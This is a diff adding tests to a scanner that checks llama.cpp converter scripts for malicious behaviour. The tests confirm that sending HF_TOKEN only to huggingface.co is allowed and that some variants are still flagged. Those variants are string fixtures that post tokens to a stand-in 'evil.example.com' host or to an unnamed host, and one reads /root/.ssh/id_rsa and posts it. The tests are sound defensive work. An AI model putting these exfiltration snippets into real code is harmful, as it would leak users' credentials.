@@ -3070,3 +3070,73 @@ def test_a_pin_written_with_a_tilde_is_still_a_pin(tmp_path, monkeypatch):
     assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
         "an unexpanded pin compared unequal to the expanded script path"
     )
+
+
+def test_a_converter_that_only_talks_to_the_model_hub_is_not_a_finding():
+    """Upstream's own gguf-py/gguf/utility.py reads HF_TOKEN and sends it to
+    huggingface.co as an Authorization header, which is what downloading a gated
+    model looks like. The env-harvest rule fired on it, so
+    UNSLOTH_CONVERTER_SCAN_STRICT refused every clean checkout of llama.cpp
+    master over a file the converter genuinely imports.
+    """
+    from unsloth_zoo.converter_scan import scan_converter_source
+
+    hub_only = (
+        'import os\n'
+        'import requests\n'
+        'BASE_DOMAIN = "https://huggingface.co"\n'
+        'def _headers():\n'
+        '    headers = {}\n'
+        '    if os.environ.get("HF_TOKEN"):\n'
+        '        headers["Authorization"] = f"Bearer {os.environ[\'HF_TOKEN\']}"\n'
+        '    return headers\n'
+        'def fetch(url):\n'
+        '    return requests.get(url, allow_redirects=True, headers=_headers())\n'
+    )
+    assert [f.check for f in scan_converter_source(hub_only)] == []
+
+    # A second destination is the whole difference, and it is still caught.
+    with_exfil = hub_only.replace(
+        'BASE_DOMAIN = "https://huggingface.co"\n',
+        'BASE_DOMAIN = "https://huggingface.co"\nEXFIL = "https://evil.example.com/c"\n',
+    )
+    assert any(
+        "Harvests environment variables" in f.check
+        for f in scan_converter_source(with_exfil)
+    ), [f.check for f in scan_converter_source(with_exfil)]
+
+    # Naming no host at all is not a pass either: suppression needs a hub host
+    # to have been named, so a destination this cannot see keeps the finding.
+    no_host = (
+        'import os\n'
+        'import requests\n'
+        'requests.post(HOST, data = {"t": os.environ["HF_TOKEN"]})\n'
+    )
+    assert any(
+        "Harvests environment variables" in f.check
+        for f in scan_converter_source(no_host)
+    )
+
+    # A file this cannot parse is not suppressed either.
+    unparseable = hub_only + "def (\n"
+    assert any(
+        "Harvests environment variables" in f.check
+        for f in scan_converter_source(unparseable)
+    )
+
+
+def test_the_hub_narrowing_does_not_reach_any_other_rule():
+    """Only the env-harvest combination is narrowed. A credential stealer or a
+    remote-code loader that happens to mention the hub is untouched.
+    """
+    from unsloth_zoo.converter_scan import scan_converter_source
+
+    creds = (
+        'import requests\n'
+        'BASE_DOMAIN = "https://huggingface.co"\n'
+        'data = open("/root/.ssh/id_rsa").read()\n'
+        'requests.post(BASE_DOMAIN, data = data)\n'
+    )
+    assert any("credential paths" in f.check for f in scan_converter_source(creds)), (
+        [f.check for f in scan_converter_source(creds)]
+    )
